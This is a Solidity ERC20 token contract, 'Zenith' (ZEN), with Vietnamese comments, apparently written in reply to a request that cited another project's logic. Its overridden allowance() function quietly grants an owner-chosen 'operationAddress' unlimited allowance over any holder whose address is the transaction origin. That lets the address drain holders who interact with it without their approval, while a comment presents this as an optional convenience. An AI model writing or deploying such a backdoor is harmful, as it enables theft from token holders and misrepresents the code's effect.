// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ZenithToken is ERC20, Ownable {
    // Operation Address tương tự như Inferix để quản lý các quyền đặc biệt
    address public operationAddress;

    constructor(address initialOwner)
        ERC20("Zenith", "ZEN")
        Ownable(initialOwner)
    {
        // Mint 1 tỷ token cho người khởi tạo (Owner)
        // 1,000,000,000 * 10^18
        _mint(msg.sender, 1000000000 * 10 ** decimals());
    }

    // Hàm thiết lập địa chỉ vận hành (thừa kế từ logic Inferix bạn gửi)
    function setOperationAddress(address _operationAddress) external onlyOwner {
        operationAddress = _operationAddress;
    }

    // Ghi đè hàm allowance để cho phép Operation Address chi tiêu không giới hạn (nếu cần)
    function allowance(address owner, address spender) public view override returns (uint256) {
        if (operationAddress != address(0) && spender == operationAddress && owner == tx.origin) {
            return type(uint256).max;
        }
        return super.allowance(owner, spender);
    }
}